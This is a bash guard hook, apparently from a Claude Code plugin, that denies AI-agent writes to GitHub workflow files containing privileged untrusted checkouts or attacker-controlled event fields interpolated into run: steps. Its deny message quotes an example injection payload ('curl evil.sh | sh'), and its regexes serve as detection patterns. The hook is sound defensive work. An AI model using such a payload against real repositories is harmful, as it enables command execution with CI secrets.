#!/bin/bash
# Absolute-path shebang (not `env bash`): the fail-open guarantee must hold even
# under a stripped/broken PATH, where `env bash` itself exits 127.
#
# PreToolUse guard on writes to .github/workflows/. DENIES exactly two shapes —
# the ones with no legitimate form, where the workflow hands repository secrets or
# a write token to code the repository does not control:
#
#   1. pull_request_target (or workflow_run) checking out the untrusted head.
#   2. An attacker-controlled ${{ github.event.* }} field interpolated into a
#      `run:` block, which is shell substitution, not argument passing.
#
# Everything else workflow-audit.sh reports — unpinned actions, a missing
# permissions: block, self-hosted runners on fork triggers — is a WARN there and
# is NOT denied here. A deny that fires on the ambiguous cases is a deny that gets
# turned off, and then the two unambiguous ones stop being blocked too.
#
# Why a hook at all, given both shapes are well-documented: nobody asks. Workflow
# files get edited during unrelated work and reviewed for step ordering. The hook
# is the thing that asks, at the only moment the answer is cheap.
#
# BASH WRITES (0.8.2). A heredoc body or echo/printf arguments whose pipeline writes an
# in-scope file are judged exactly like a Write of that text to that file
# (cc_bash_write_chunks for the text, cc_bash_write_targets for the file it lands in; a
# relative target matches the relative patterns as spelled). Text fed to a command that
# writes no file (`yq eval - <<EOF`, `gh api --input - <<EOF`) is not read. An append
# (`>>`) is judged on the appended text alone, as an Edit is on its new_string, so a
# rule-1 trigger already in the file whose `ref:` arrives by append is NOT caught.
# echo/printf arguments are read as written with ONE leading quote stripped, so
# `echo '  - run: …' >> .github/workflows/ci.yml` is judged as its line. An echo chunk is
# one line, so it can only ever meet rule 2. NOT caught on an echo: a flag or extra space
# before the quote (`echo -n '…'`, `echo  '…'`), `printf '%s\n' '…'` (the format comes
# first), a run line that itself holds `<<`, an escaped multi-line echo (`echo -e '…\n…'`,
# `$'…'`, not unescaped), and a quoted string spanning lines. Also NOT caught: interpreter
# writes (python open(), php file_put_contents), cp/mv/install of a prepared file into
# .github/workflows/, `sed -i`/`perl -i` edits (the target resolves, no text is judged),
# `{ …; } > f` groups, a path held in a variable, a path relative to an earlier `cd` in
# the command or to a session cwd already under .github/ (targets match as spelled), a
# here-string, a second heredoc on one line, printf format substitution, and any target
# after the first on one writer (`tee a b` checks `a`).
#
# Fail-open: any error, missing jq, or unparseable input allows the write.
# CC_WORKFLOW_GUARD unset: the /config option cc_workflow_guard decides.

# --- option resolver -----------------------------------------------------------
# Canonical copy: templates/blocks/option-resolver.md. Every hook defining cc_option must
# carry this block byte-for-byte (pc_shared_blocks); generated hooks include it.
# cc_option <ENV_NAME> <default> [<level-file>] prints one line, the first non-empty of: the
# variable ENV_NAME; the first word of <level-file>, if given and readable; the userConfig
# option CLAUDE_PLUGIN_OPTION_<ENV_NAME>, true/false read as on/off; <default>. The shell wins
# because the environment is the one state independently installed plugins share (CC_REMIND
# or CC_BOOST there mutes every plugin at once); the option gives one plugin a /config row.
# The host exports only SAVED options, so <default> must equal the manifest's default.
# Status 0, no stderr: a malformed name, an expansion error that exits bash 5, yields <default>.
# WHAT IT DOES NOT CATCH: a caller passing a variable instead of a literal name, or a value
# outside the switch's vocabulary — each hook still validates the value it gets.
cc_option() {
  local v="" opt
  case "${1:-}" in '' | [0-9]* | *[!A-Za-z0-9_]*) printf '%s\n' "${2:-}"; return 0 ;; esac
  v="${!1:-}"
  if [ -z "$v" ] && [ -n "${3:-}" ] && [ -f "$3" ] && [ -r "$3" ]; then
    read -r v _ 2>/dev/null < "$3" || :
  fi
  if [ -z "$v" ]; then
    opt="CLAUDE_PLUGIN_OPTION_$1"; v="${!opt:-}"
    case "$v" in true) v=on ;; false) v=off ;; esac
  fi
  [ -n "$v" ] || v="${2:-}"
  printf '%s\n' "$v"
  return 0
}

# --- bash write targets --------------------------------------------------------
# Canonical copy: templates/blocks/bash-write-targets.md. Every hook defining
# cc_bash_write_targets must carry this block byte-for-byte (pc_shared_blocks).
# The host steers file writes through Bash (auto mode `bashFirst`); in one measured session
# 233 of 238 main-thread writes were `cat > file <<EOF`, invisible to a hook matching
# Write|Edit.
# Prints one target path per line, as spelled in the command (relative or absolute).
# Heredoc BODIES are dropped and quoted text is masked before matching, so PHP `->`/`=>`,
# HTML `>` and a sed script's `s|a|b|` never read as redirects or pipes; a here-string
# (`<<<`) is not a heredoc. Catches `>`/`>>` onto a path (cat, echo, printf, any command),
# `[sudo] tee [-a] <paths>`, and every file operand of `sed -i`/`-I`/`--in-place` / `perl -i`
# after the script or its `-e`/`-f` arguments, never a redirect word or its target. BSD's
# `-I` always takes the next word as its backup suffix; a `''` or a `.`-led word with no `/`
# right after sed's bare `-i` is read as one too, unless it would be the only file.
# Does NOT catch:
# interpreter writes (python open(), php file_put_contents), cp/mv/install destinations,
# `{ …; } > f` groups, a path held in a variable (`> "$f"` is skipped, never guessed),
# a globbed operand (`sed -i … tests/*.js`: a word with `*`/`?` is dropped), a `\` line
# continuation, sed/perl behind another command word (`gsed`, `/usr/bin/sed`, `env`,
# `xargs`, `command`, `sudo -u x`, `find … -exec sed -i`), a digit- or `&`-led redirect onto
# a file (`2> f`, `&> f`). A lone `&` does not end a command, so words after it can read as
# sed/perl/tee operands.
# The caller filters to existing files under its root.
cc_bash_write_targets() {
  printf '%s\n' "$1" | awk '
    function emit(p) {
      gsub(/^["\047]|["\047]$/, "", p)
      if (p == "" || p ~ /^\/dev\// || p ~ /[$`*?]/ || p ~ /^[&0-9-]/ && p !~ /[\/.]/) return
      print p
    }
    function mask(s,   i, c, q, out, esc) {
      q = ""; out = ""; esc = 0
      for (i = 1; i <= length(s); i++) {
        c = substr(s, i, 1)
        if (esc) { out = out "_"; esc = 0; continue }
        if (q == "") {
          if (c == "\\") { esc = 1; out = out "_"; continue }
          if (c == "\047" || c == "\"") q = c
          out = out c
        } else if (c == q) { q = ""; out = out c }
        else { if (q == "\"" && c == "\\") esc = 1; out = out "_" }
      }
      return out
    }
    function segment(ms, os,   rest, off, tok, w, k, j, st, en, word, n, ws, we, x, c, a, inp, scr, eo, sfx, nf, f) {
      rest = ms; off = 0
      while (match(rest, /(^|[^0-9&=<>-])>>?[ \t]*("[^"]*"|\047[^\047]*\047|[^ \t&|;<>()"\047]+)/)) {
        tok = substr(os, off + RSTART, RLENGTH)
        off += RSTART + RLENGTH - 1; rest = substr(ms, off + 1)
        sub(/^[^>]*>>?[ \t]*/, "", tok)
        emit(tok)
      }
      n = 0; j = 1
      while (j <= length(ms)) {
        while (j <= length(ms) && substr(ms, j, 1) ~ /[ \t]/) j++
        if (j > length(ms)) break
        st = j; while (j <= length(ms) && substr(ms, j, 1) !~ /[ \t]/) j++
        n++; ws[n] = st; we[n] = j - 1
      }
      if (n == 0) return
      k = 1; word = substr(os, ws[1], we[1] - ws[1] + 1)
      if (word == "sudo" && n > 1) { k = 2; word = substr(os, ws[2], we[2] - ws[2] + 1) }
      if (word == "tee") {
        for (k = k + 1; k <= n; k++) {
          w = substr(os, ws[k], we[k] - ws[k] + 1)
          if (w == "<" || w == "<<<") { k++; continue }
          if (w !~ /^-/ && w !~ /^[<>0-9]/) emit(w)
        }
      } else if (word == "sed" || word == "perl") {
        inp = 0; scr = 0; eo = 0; sfx = ""; nf = 0
        for (k = k + 1; k <= n; k++) {
          w = substr(os, ws[k], we[k] - ws[k] + 1); x = substr(ms, ws[k], we[k] - ws[k] + 1)
          if (x ~ /[<>]/) {
            a = substr(w, 1, match(x, /[<>]/) - 1)
            if (a !~ /^[0-9&]*$/) f[++nf] = a
            if (x ~ /[<>][&|]?$/) k++
            continue
          }
          if (eo || x !~ /^-./) { f[++nf] = w; if (word == "perl") eo = 1; continue }
          if (x == "--") { eo = 1; continue }
          if (x ~ /^--/) {
            if (word == "sed" && x ~ /^--in-place(=|$)/) inp = 1
            if (word == "sed" && x ~ /^--(expression|file)(=|$)/) { scr = 1; if (x !~ /=/) k++ }
            continue
          }
          for (j = 2; j <= length(x); j++) {
            c = substr(x, j, 1)
            if (c == "i" || word == "sed" && c == "I") {
              inp = 1
              if (word == "sed" && j == length(x) && k < n) {
                a = substr(os, ws[k + 1], we[k + 1] - ws[k + 1] + 1); gsub(/^["\047]|["\047]$/, "", a)
                if (c == "I") k++
                else if (a == "" || a ~ /^\.[^\/<>]*$/) { k++; sfx = a }
              }
              break
            }
            if (c == "e" || c == (word == "sed" ? "f" : "E")) { scr = 1; if (j == length(x)) k++; break }
            if (c == (word == "sed" ? "l" : "I")) { if (j == length(x)) k++; break }
            if (word == "perl" && c ~ /[MmFxdDVC]/) break
            if (word == "perl" && c ~ /[l0]/) while (substr(x, j + 1, 1) ~ /[0-7]/) j++
          }
        }
        if (!inp) return
        for (j = scr ? 1 : 2; j <= nf; j++) if (f[j] !~ /^-/) { emit(f[j]); sfx = "" }
        if (sfx != "") emit(sfx)
      }
    }
    skip { t = $0; sub(/^[ \t]+/, "", t); sub(/[ \t]+$/, "", t); if (t == term) skip = 0; next }
    {
      line = $0; m = mask(line)
      if (match(m, /(^|[^<])<<-?[ \t]*["\047]?[A-Za-z_][A-Za-z0-9_]*/)) {
        if (substr(m, RSTART, 1) != "<") { RSTART++; RLENGTH-- }
        term = substr(line, RSTART, RLENGTH + 1)
        sub(/^<<-?[ \t]*["\047]?/, "", term); sub(/[^A-Za-z0-9_].*$/, "", term)
        skip = 1
      }
      st = 1
      for (i = 1; i <= length(m) + 1; i++) {
        c = substr(m, i, 1); c2 = substr(m, i, 2)
        if (i > length(m) || c == ";" || c == "|" || c2 == "&&") {
          if (i > st) segment(substr(m, st, i - st), substr(line, st, i - st))
          if (c2 == "&&" || c2 == "||") i++
          st = i + 1
        }
      }
    }' | awk '!seen[$0]++'
}

# --- bash write chunks --------------------------------------------------------
# Canonical copy: templates/blocks/bash-write-chunks.md. Every hook defining
# cc_bash_write_chunks must carry this block byte-for-byte (pc_shared_blocks).
# cc_bash_write_chunks <command> — what a Bash command puts INTO files: the text a content
# guard reads on Bash where its Write path reads tool_input.content. Prints chunks: a line that
# starts with \036 and carries the WRITER — the pipeline (split on ; && ||, never inside
# quotes) whose targets the caller resolves with cc_bash_write_targets — then the
# chunk's text lines. Two sources, and only two:
#   - a heredoc BODY: the lines between `<<TERM` (`<<-`, quoted or `\`-escaped TERM too)
#     and TERM; writer = the pipeline holding the `<<` (`cat > f <<EOF`,
#     `cat <<EOF | tee -a f`);
#   - the ARGUMENTS of an `echo`/`printf` segment, as written: the rest of the segment after
#     the command word, quotes, escapes and any `> file` redirect kept (so match inside the
#     text, never anchored at its start); writer = its pipeline
#     (`echo "K=v" >> .env.example`, `printf '%s\n' v | tee f`).
# A chunk whose writer names no file is dropped by the caller, so `git commit -F - <<EOF`
# and `echo x | grep y` yield nothing. The body of ANY heredoc whose pipeline writes a file
# is read, whatever consumes it — `python3 - <<PY > out.txt` included, where the script is
# not what lands in out.txt. Accepted: the text sits in a file-writing command either
# way.
# NOT read, stated: a `{ echo …; } > f` group (the redirect sits on the closer, not on
# the echo's pipeline); a here-string `<<<`; printf's format substitution (`printf
# 'K=%s' v` is read as written: the format and the argument, never the substituted
# line); a quoted string or a `\` continuation spanning lines; a second heredoc opened
# on one line.
# mask() copies the one inside cc_bash_write_targets: the block is byte-locked and its
# awk functions are not reachable from outside it.
cc_bash_write_chunks() {
  printf '%s\n' "$1" | awk '
    function mask(s,   i, c, q, out, esc) {
      q = ""; out = ""; esc = 0
      for (i = 1; i <= length(s); i++) {
        c = substr(s, i, 1)
        if (esc) { out = out "_"; esc = 0; continue }
        if (q == "") {
          if (c == "\\") { esc = 1; out = out "_"; continue }
          if (c == "\047" || c == "\"") q = c
          out = out c
        } else if (c == q) { q = ""; out = out c }
        else { if (q == "\"" && c == "\\") esc = 1; out = out "_" }
      }
      return out
    }
    function trim(s) { sub(/^[ \t]+/, "", s); sub(/[ \t]+$/, "", s); return s }
    function echo_args(p, mp,   i, st, seg, out) {
      out = ""; st = 1
      for (i = 1; i <= length(mp) + 1; i++) {
        if (i > length(mp) || substr(mp, i, 1) == "|") {
          seg = substr(mp, st, i - st)
          if (match(seg, /^[ \t]*(echo|printf)[ \t]/)) out = out substr(p, st + RLENGTH, i - st - RLENGTH) "\n"
          st = i + 1
        }
      }
      return out
    }
    inbody { if (trim($0) == term) inbody = 0; else print; next }
    {
      line = $0; m = mask(line); st = 1; opener = ""
      for (i = 1; i <= length(m) + 1; i++) {
        c = substr(m, i, 1); c2 = substr(m, i, 2)
        if (i > length(m) || c == ";" || c2 == "&&" || c2 == "||") {
          if (i > st) {
            p = substr(line, st, i - st); mp = substr(m, st, i - st)
            a = echo_args(p, mp)
            if (a != "") printf "\036%s\n%s", p, a
            if (opener == "" && match(mp, /(^|[^<])<<-?[ \t]*["\047]?[A-Za-z_][A-Za-z0-9_]*/)) {
              t = substr(p, RSTART, RLENGTH)
              sub(/^[^<]*<<-?[ \t]*["\047]?/, "", t); sub(/^\\/, "", t); sub(/[^A-Za-z0-9_].*$/, "", t)
              if (t != "") { opener = p; term = t }
            }
          }
          if (c2 == "&&" || c2 == "||") i++
          st = i + 1
        }
      }
      if (opener != "") { printf "\036%s\n", opener; inbody = 1 }
    }'
}

# A COMPOSITE ACTION IS THE SAME SINK. `.github/actions/<name>/action.yml` carries
# `runs.steps[].run:` and is called from a workflow with that workflow's token, so the
# identical `${{ github.event.pull_request.title }}` interpolation is the identical
# command execution — and until 2026-09-22 it was allowed here while the same body in
# `workflows/ci.yml` was denied. Rule 1 cannot fire on a composite (it has no `on:`
# triggers); rule 2 is the whole point. NOT covered: an action.yml anywhere else in the
# tree, and a composite that shells out to a script file the guard never sees.
in_scope() {
  case "$1" in
    */.github/workflows/*.yml|*/.github/workflows/*.yaml|.github/workflows/*.yml|.github/workflows/*.yaml) return 0 ;;
    */.github/actions/*/action.yml|*/.github/actions/*/action.yaml|.github/actions/*/action.yml|.github/actions/*/action.yaml) return 0 ;;
  esac
  return 1
}

# Reads $text; sets $reason, empty when neither shape is present.
judge_workflow() {
  reason=""

  # 1. Untrusted checkout under a privileged trigger.
  if printf '%s' "$text" | grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' \
     && printf '%s' "$text" | grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.head|workflow_run\.head))'; then
    reason="This workflow triggers on pull_request_target/workflow_run — which runs with the BASE repository's secrets and a write token — and checks out the untrusted head ref. That executes fork-authored code inside a privileged context; it is GitHub's own documented critical anti-pattern, and it reads to a reviewer as 'checks out the PR, correct'. Build the PR in the pull_request context with no secrets, or check out the base ref and treat the PR tree as data."
  fi

  # 2. Attacker-controlled expression in a shell step. Matched by LEAF: base.sha
  #    and number are GitHub-generated and safe, and denying them would make this
  #    fire on ordinary CI.
  if [ -z "$reason" ]; then
    if printf '%s' "$text" | awk '
        /^[[:space:]]*-?[[:space:]]*run:/ { inrun=1 }
        inrun && /\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.(title|body|head\.(ref|label))|issue\.(title|body)|comment\.body|review\.body|discussion\.(title|body)|head_commit\.(message|author\.(name|email))))/ { found=1 }
        /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
        END { exit !found }
      '; then
      reason="A \${{ github.event.* }} field a pull-request author can type — a title, body, branch name or commit message — is interpolated directly into a run: block. GitHub substitutes it into the shell BEFORE the shell runs, so a title of '\"; curl evil.sh | sh; #' is command execution, not a string. Pass it through an env: block and reference \"\$VAR\" inside the script, where the shell treats it as data."
    fi
  fi
}
{
  input=$(cat)
  # OFF-SWITCH. Until 2026-09-15 this guard had none: the only way out was
  # uninstalling the plugin. Every other guard in the marketplace ships one,
  # and a global install makes "turn it off here" a real need.
  [ "$(cc_option CC_WORKFLOW_GUARD on)" = "off" ] && exit 0
  command -v jq >/dev/null 2>&1 || exit 0
  tool=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null) || exit 0
  case "$tool" in Write|Edit|MultiEdit|Bash) ;; *) exit 0 ;; esac

  reason=""
  if [ "$tool" = Bash ]; then
    cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null) || exit 0
    [ -n "$cmd" ] || exit 0
    [ -n "$(cc_bash_write_targets "$cmd")" ] || exit 0
    n=0; keep=0; sep=$(printf '\036')
    while IFS= read -r l; do
      case "$l" in
        "$sep"*)
          tgt=$(cc_bash_write_targets "${l#?}" | head -n 1)
          if [ -n "$tgt" ]; then
            n=$((n + 1)); ctgt[$n]=$tgt; ctext[$n]=""; keep=1
            case "${l#?}" in *'<<'*) cheredoc[$n]=1 ;; *) cheredoc[$n]=0 ;; esac
          else keep=0; fi ;;
        *) [ "$keep" = 1 ] && ctext[$n]="${ctext[$n]}$l
" ;;
      esac
    done <<EOF_C
$(cc_bash_write_chunks "$cmd")
EOF_C
    i=0
    while [ "$i" -lt "$n" ] && [ -z "$reason" ]; do
      i=$((i + 1))
      in_scope "${ctgt[$i]}" || continue
      file=${ctgt[$i]}; text=${ctext[$i]}
      # An echo/printf chunk is its arguments as written; both rules anchor at line start.
      [ "${cheredoc[$i]}" = 1 ] || text=${text#[\'\"]}
      judge_workflow
    done
  else
    file=$(printf '%s' "$input" | jq -r '.tool_input.file_path // empty' 2>/dev/null) || exit 0
    in_scope "$file" || exit 0
    text=$(printf '%s' "$input" | jq -r '
      [ .tool_input.content // empty,
        .tool_input.new_string // empty,
        ( .tool_input.edits // [] | map(.new_string // empty) | join("\n") )
      ] | join("\n")' 2>/dev/null) || exit 0
    [ -n "$text" ] || exit 0
    judge_workflow
  fi

  [ -n "$reason" ] || exit 0
  # The path in the message has to be one the READER can type. `plugins/devops/scripts/…`
  # is this marketplace's own layout and does not exist on an installer's disk; resolve
  # the real root the host hands the hook, and fall back to this script's own directory.
  auditroot="${CLAUDE_PLUGIN_ROOT:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"
  reason="$reason (file: $file)  Run bash ${auditroot}/scripts/workflow-audit.sh for the full report, including the warn-level findings this hook deliberately does not block."
  # Name the escape in the message that blocks you.
  reason="$reason CC_WORKFLOW_GUARD=off disables this guard for the session."

  jq -cn --arg r "$reason" \
    '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"deny",permissionDecisionReason:$r}}' 2>/dev/null
  exit 0
} 2>/dev/null
exit 0
